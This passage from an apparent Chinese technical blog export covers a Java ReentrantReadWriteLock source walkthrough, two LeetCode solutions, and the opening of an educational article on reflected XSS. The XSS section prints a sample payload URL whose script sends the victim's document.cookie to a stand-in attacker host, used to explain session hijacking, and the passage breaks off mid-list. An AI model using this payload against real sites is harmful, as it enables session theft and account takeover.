<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">writerShouldBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; <span class="comment">// writers can always barge</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="写锁的释放"><a href="#写锁的释放" class="headerlink" title="写锁的释放"></a>写锁的释放</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Note that tryRelease and tryAcquire can be called by</span></span><br><span class="line"><span class="comment">         * Conditions. So it is possible that their arguments contain</span></span><br><span class="line"><span class="comment">         * both read and write holds that are all released during a</span></span><br><span class="line"><span class="comment">         * condition wait and re-established in tryAcquire.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> releases)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!isHeldExclusively())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">            <span class="keyword">int</span> nextc = getState() - releases;</span><br><span class="line">            <span class="keyword">boolean</span> free = exclusiveCount(nextc) == <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (free)</span><br><span class="line">                setExclusiveOwnerThread(<span class="keyword">null</span>);</span><br><span class="line">            setState(nextc);</span><br><span class="line">            <span class="keyword">return</span> free;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>流程基本上和ReentrantLock差不多，因为写锁是同步状态的低16位表示的，所以，直接用getState()-releases就行了。</p>
<h2 id="读锁"><a href="#读锁" class="headerlink" title="读锁"></a>读锁</h2><p>读锁和写锁不一样，它不是独占的，排他的，它是一种共享锁。同一时刻可以被多个线程获取。按照上一篇AQS文章中的介绍，读锁需要重写AQS中的tryAcquireShared和tryReleaseShared方法。</p>
<h3 id="读锁的获取"><a href="#读锁的获取" class="headerlink" title="读锁的获取"></a>读锁的获取</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">tryAcquireShared</span><span class="params">(<span class="keyword">int</span> unused)</span> </span>&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Walkthrough:</span></span><br><span class="line"><span class="comment">             * 1. If write lock held by another thread, fail.</span></span><br><span class="line"><span class="comment">             * 2. Otherwise, this thread is eligible for</span></span><br><span class="line"><span class="comment">             *    lock wrt state, so ask if it should block</span></span><br><span class="line"><span class="comment">             *    because of queue policy. If not, try</span></span><br><span class="line"><span class="comment">             *    to grant by CASing state and updating count.</span></span><br><span class="line"><span class="comment">             *    Note that step does not check for reentrant</span></span><br><span class="line"><span class="comment">             *    acquires, which is postponed to full version</span></span><br><span class="line"><span class="comment">             *    to avoid having to check hold count in</span></span><br><span class="line"><span class="comment">             *    the more typical non-reentrant case.</span></span><br><span class="line"><span class="comment">             * 3. If step 2 fails either because thread</span></span><br><span class="line"><span class="comment">             *    apparently not eligible or CAS fails or count</span></span><br><span class="line"><span class="comment">             *    saturated, chain to version with full retry loop.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            Thread current = Thread.currentThread();</span><br><span class="line">            <span class="keyword">int</span> c = getState();</span><br><span class="line">            <span class="keyword">if</span> (exclusiveCount(c) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">                getExclusiveOwnerThread() != current)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> r = sharedCount(c);</span><br><span class="line">            <span class="keyword">if</span> (!readerShouldBlock() &amp;&amp;</span><br><span class="line">                r &lt; MAX_COUNT &amp;&amp;</span><br><span class="line">                compareAndSetState(c, c + SHARED_UNIT)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (r == <span class="number">0</span>) &#123;</span><br><span class="line">                    firstReader = current;</span><br><span class="line">                    firstReaderHoldCount = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (firstReader == current) &#123;</span><br><span class="line">                    firstReaderHoldCount++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    HoldCounter rh = cachedHoldCounter;</span><br><span class="line">                    <span class="keyword">if</span> (rh == <span class="keyword">null</span> || rh.tid != getThreadId(current))</span><br><span class="line">                        cachedHoldCounter = rh = readHolds.get();</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (rh.count == <span class="number">0</span>)</span><br><span class="line">                        readHolds.set(rh);</span><br><span class="line">                    rh.count++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> fullTryAcquireShared(current);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>JDK源码自带的注释已经说得很清楚了。</p>
<ol>
<li>如果写锁被其他线程获取了，获取读锁失败</li>
<li>否则，获取读锁成功，更新同步状态，只更新同步状态c的高16位的值</li>
<li>无论是CAS失败或者同一线程再次获取读锁时，都会调用fullTryAcquireShared方法</li>
</ol>
<p><strong>fullTryAcquireShared</strong>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Full version of acquire for reads, that handles CAS misses</span></span><br><span class="line"><span class="comment">         * and reentrant reads not dealt with in tryAcquireShared.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">fullTryAcquireShared</span><span class="params">(Thread current)</span> </span>&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * This code is in part redundant with that in</span></span><br><span class="line"><span class="comment">             * tryAcquireShared but is simpler overall by not</span></span><br><span class="line"><span class="comment">             * complicating tryAcquireShared with interactions between</span></span><br><span class="line"><span class="comment">             * retries and lazily reading hold counts.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            HoldCounter rh = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="keyword">int</span> c = getState();</span><br><span class="line">                <span class="keyword">if</span> (exclusiveCount(c) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (getExclusiveOwnerThread() != current)</span><br><span class="line">                        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                    <span class="comment">// else we hold the exclusive lock; blocking here</span></span><br><span class="line">                    <span class="comment">// would cause deadlock.</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (readerShouldBlock()) &#123;</span><br><span class="line">                    <span class="comment">// Make sure we're not acquiring read lock reentrantly</span></span><br><span class="line">                    <span class="keyword">if</span> (firstReader == current) &#123;</span><br><span class="line">                        <span class="comment">// assert firstReaderHoldCount &gt; 0;</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (rh == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            rh = cachedHoldCounter;</span><br><span class="line">                            <span class="keyword">if</span> (rh == <span class="keyword">null</span> || rh.tid != getThreadId(current)) &#123;</span><br><span class="line">                                rh = readHolds.get();</span><br><span class="line">                                <span class="keyword">if</span> (rh.count == <span class="number">0</span>)</span><br><span class="line">                                    readHolds.remove();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (rh.count == <span class="number">0</span>)</span><br><span class="line">                            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (sharedCount(c) == MAX_COUNT)</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Maximum lock count exceeded"</span>);</span><br><span class="line">                <span class="keyword">if</span> (compareAndSetState(c, c + SHARED_UNIT)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (sharedCount(c) == <span class="number">0</span>) &#123;</span><br><span class="line">                        firstReader = current;</span><br><span class="line">                        firstReaderHoldCount = <span class="number">1</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (firstReader == current) &#123;</span><br><span class="line">                        firstReaderHoldCount++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (rh == <span class="keyword">null</span>)</span><br><span class="line">                            rh = cachedHoldCounter;</span><br><span class="line">                        <span class="keyword">if</span> (rh == <span class="keyword">null</span> || rh.tid != getThreadId(current))</span><br><span class="line">                            rh = readHolds.get();</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (rh.count == <span class="number">0</span>)</span><br><span class="line">                            readHolds.set(rh);</span><br><span class="line">                        rh.count++;</span><br><span class="line">                        cachedHoldCounter = rh; <span class="comment">// cache for release</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>代码和tryAcquireShared类似。就是一个dead loop，不断去尝试设置同步状态。</p>
<h3 id="读锁的释放"><a href="#读锁的释放" class="headerlink" title="读锁的释放"></a>读锁的释放</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryReleaseShared</span><span class="params">(<span class="keyword">int</span> unused)</span> </span>&#123;</span><br><span class="line">            Thread current = Thread.currentThread();</span><br><span class="line">            <span class="keyword">if</span> (firstReader == current) &#123;</span><br><span class="line">                <span class="comment">// assert firstReaderHoldCount &gt; 0;</span></span><br><span class="line">                <span class="keyword">if</span> (firstReaderHoldCount == <span class="number">1</span>)</span><br><span class="line">                    firstReader = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    firstReaderHoldCount--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                HoldCounter rh = cachedHoldCounter;</span><br><span class="line">                <span class="keyword">if</span> (rh == <span class="keyword">null</span> || rh.tid != getThreadId(current))</span><br><span class="line">                    rh = readHolds.get();</span><br><span class="line">                <span class="keyword">int</span> count = rh.count;</span><br><span class="line">                <span class="keyword">if</span> (count &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">                    readHolds.remove();</span><br><span class="line">                    <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">throw</span> unmatchedUnlockException();</span><br><span class="line">                &#125;</span><br><span class="line">                --rh.count;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="keyword">int</span> c = getState();</span><br><span class="line">                <span class="keyword">int</span> nextc = c - SHARED_UNIT;</span><br><span class="line">                <span class="keyword">if</span> (compareAndSetState(c, nextc))</span><br><span class="line">                    <span class="comment">// Releasing the read lock has no effect on readers,</span></span><br><span class="line">                    <span class="comment">// but it may allow waiting writers to proceed if</span></span><br><span class="line">                    <span class="comment">// both read and write locks are now free.</span></span><br><span class="line">                    <span class="keyword">return</span> nextc == <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="锁降级"><a href="#锁降级" class="headerlink" title="锁降级"></a>锁降级</h2><p>锁降级指的是写锁降级成为读锁。如果当前线程拥有写锁，然后将其释放，最后再获取读锁，这种分段完成的过程不能称之为锁降级。锁降级是指把持住（当前拥有的）写锁，再获取到读锁，随后释放（先前拥有的）写锁的过程。</p>
<p>可以看看官方文档对锁降级的示例代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CachedData</span> </span>&#123;</span><br><span class="line">   Object data;</span><br><span class="line">   <span class="keyword">volatile</span> <span class="keyword">boolean</span> cacheValid;</span><br><span class="line">   <span class="keyword">final</span> ReentrantReadWriteLock rwl = <span class="keyword">new</span> ReentrantReadWriteLock();</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">processCachedData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     rwl.readLock().lock();</span><br><span class="line">     <span class="keyword">if</span> (!cacheValid) &#123;</span><br><span class="line">       <span class="comment">// Must release read lock before acquiring write lock</span></span><br><span class="line">       rwl.readLock().unlock();</span><br><span class="line">       rwl.writeLock().lock();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// Recheck state because another thread might have</span></span><br><span class="line">         <span class="comment">// acquired write lock and changed state before we did.</span></span><br><span class="line">         <span class="keyword">if</span> (!cacheValid) &#123;</span><br><span class="line">           data = ...</span><br><span class="line">           cacheValid = <span class="keyword">true</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// Downgrade by acquiring read lock before releasing write lock</span></span><br><span class="line">         rwl.readLock().lock();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         rwl.writeLock().unlock(); <span class="comment">// Unlock write, still hold read</span></span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">       use(data);</span><br><span class="line">     &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">       rwl.readLock().unlock();</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>在释放写锁前，需要先获得读锁，然后再释放写锁。如果不先获取读锁，那么其他线程在这个线程释放写锁后可能会修改data，而这种修改对于这个线程是不可见的，从而在之后的use(data)中使用的是错误的值 。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>多线程</tag>
        <tag>并发</tag>
        <tag>ReentrantReadWriteLock</tag>
      </tags>
  </entry>
  <entry>
    <title>1281. Subtract the Product and Sum of Digits of an Integer</title>
    <url>/2020/03/03/LeetCode/leetcode-001281.%20Subtract%20the%20Product%20and%20Sum%20of%20Digits%20of%20an%20Integer/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an integer number <code>n</code>, return the difference between the product of its digits and the sum of its digits.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: n &#x3D; 234</span><br><span class="line">Output: 15 </span><br><span class="line">Explanation: </span><br><span class="line">Product of digits &#x3D; 2 * 3 * 4 &#x3D; 24 </span><br><span class="line">Sum of digits &#x3D; 2 + 3 + 4 &#x3D; 9 </span><br><span class="line">Result &#x3D; 24 - 9 &#x3D; 15</span><br></pre></td></tr></table></figure>

<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: n = <span class="number">4421</span></span><br><span class="line">Output: <span class="number">21</span></span><br><span class="line">Explanation: </span><br><span class="line">Product of digits = <span class="number">4</span> * <span class="number">4</span> * <span class="number">2</span> * <span class="number">1</span> = <span class="number">32</span> </span><br><span class="line">Sum of digits = <span class="number">4</span> + <span class="number">4</span> + <span class="number">2</span> + <span class="number">1</span> = <span class="number">11</span> </span><br><span class="line">Result = <span class="number">32</span> - <span class="number">11</span> = <span class="number">21</span></span><br></pre></td></tr></table></figure>

<h3 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> &lt;= n &lt;= <span class="number">10</span>^<span class="number">5</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>循环取余，再求和，求积。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">subtractProductAndSum</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> product = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">0</span> != n) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = n % <span class="number">10</span>;</span><br><span class="line">            sum += temp;</span><br><span class="line">            product *= temp;</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> product - sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">subtractProductAndSum</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> product = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(n) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = n % <span class="number">10</span>;</span><br><span class="line">            sum += temp;</span><br><span class="line">            product *= temp;</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> product - sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>1365. How Many Numbers Are Smaller Than the Current Number</title>
    <url>/2020/03/02/LeetCode/leetcode-001365.-How-Many-Numbers-Are-Smaller-Than-the-Current-Number/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given the array <code>nums</code>, for each <code>nums[i]</code> find out how many numbers in the array are smaller than it. That is, for each <code>nums[i]</code> you have to count the number of valid <code>j&#39;s</code> such that <code>j != i</code> <strong>and</strong> <code>nums[j] &lt; nums[i]</code>.</p>
<p>Return the answer in an array.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums &#x3D; [8,1,2,2,3]</span><br><span class="line">Output: [4,0,1,1,3]</span><br><span class="line">Explanation: </span><br><span class="line">For nums[0]&#x3D;8 there exist four smaller numbers than it (1, 2, 2 and 3). </span><br><span class="line">For nums[1]&#x3D;1 does not exist any smaller number than it.</span><br><span class="line">For nums[2]&#x3D;2 there exist one smaller number than it (1). </span><br><span class="line">For nums[3]&#x3D;2 there exist one smaller number than it (1). </span><br><span class="line">For nums[4]&#x3D;3 there exist three smaller numbers than it (1, 2 and 2).</span><br></pre></td></tr></table></figure>

<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">8</span>]</span><br><span class="line">Output: [<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure>

<h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3:"></a>Example 3:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>]</span><br><span class="line">Output: [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<h3 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> &lt;= nums.length &lt;= <span class="number">500</span></span><br><span class="line"><span class="number">0</span> &lt;= nums[i] &lt;= <span class="number">100</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>暴力破解。两次遍历，统计每个比每个数字小的总数即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] smallerNumbersThanCurrent(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; nums.length;j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                    result[i]++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; nums.<span class="built_in">size</span>();j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            result.emplace_back(count);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>从题目的限制条件来看，数字的值最大也只有100.因此，可以申请一个长度为100的数组count，值初始化为0。然后遍历nums，对每个nums[i]，count[nums[i]]位置上的值自增1.</p>
<p>接着，遍历count数组，将count[i]上的值，赋为它前一位以及当前位的和。</p>
<p>最后遍历nums数组，直接将count[muns[i] - 1]位置上的值取出置入结果数组即可。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] smallerNumbersThanCurrent(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">101</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">            count[nums[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; count.length;i++) &#123;</span><br><span class="line">            count[i] += count[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == nums[i]) &#123;</span><br><span class="line">                result[i] = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result[i] = count[nums[i]  - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">result</span><span class="params">(nums.<span class="built_in">size</span>(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">count</span><span class="params">(<span class="number">101</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            count[nums[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; count.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            count[i] += count[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i]) &#123;</span><br><span class="line">                result[i] = count[nums[i] - <span class="number">1</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result[i] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS攻击</title>
    <url>/2019/04/02/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/6-XSS%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h1><p>跨站点脚本（XSS）是Web应用程序中发现的最为普遍的漏洞，困扰着现在绝大多数的应用程序，包括因特网上一些最为注重安全的应用程序。XSS漏洞表现为各种形式，并且可分为3种类型：反射型、保存型和基于DOM的XSS漏洞。虽然这些漏洞具有一些相同的特点，但在如何确定及利用这些漏洞方面，仍然存在一些重要的差异。</p>
<h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><p>如果一个应用程序使用动态页面向用户显示错误消息，就会造成一种常见的XSS漏洞。通常，该页面会使用一个包含消息文本的参数，并在响应中将这个文本返回给用户。由于利用这种漏洞需要设计一个包含嵌入式JavaScript代码的请求，随后这些代码又被反射到任何提出请求的用户，因此它被称作反射型XSS。攻击有效载荷分别通过一个单独的请求与响应进行传送和执行。为此，有时它也被称为一阶XSS。</p>
<h3 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h3><p>利用XSS漏洞攻击应用程序其他用户的方式有很多种。最简单的一种攻击，也是我们常用于说明XSS漏洞潜在影响的一种攻击，可导致攻击者接货通过验证的用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户经授权访问的所有数据和功能。</p>
<p>实施这种攻击的步骤如图所示。</p>
<ol>
<li><p>用户正常登陆应用程序，得到一个包含会话令牌的cookie：</p>
<p>Set-Cookie: sessid=23123djksdah2132489021213</p>
</li>
<li><p>攻击者通过某种方法向用户提交以下URL:</p>
<p><a href="http://mdsec.net/error/5/Error.ashx?message=" target="_blank" rel="noopener">http://mdsec.net/error/5/Error.ashx?message=</a><script>var+i=new+Image;+i.src="<a href="http://mdattacker.net/&quot;%2bdocument.cookie" target="_blank" rel="noopener">http://mdattacker.net/&quot;%2bdocument.cookie</a>;</script></p>
<p>和前面生成一个对话框消息的示例一样，这个URL包含嵌入式JavaScript的代码。但是这个示例中的攻击有效载荷更加恶毒</p>
</li>
<li><p>用户从应用程序中请求攻击者传送给他们的URL</p>
</li>
<li><p>服务器响应用户的请求。由于应用程序中存在XSS漏洞，响应中包含攻击者创建的JavaScript代码</p>
</li>
<li><p>用户浏览器收到攻击者的JavaScript代码，像执行从应用程序收到的其他代码一样，浏览器执行这段代码</p>
</li>
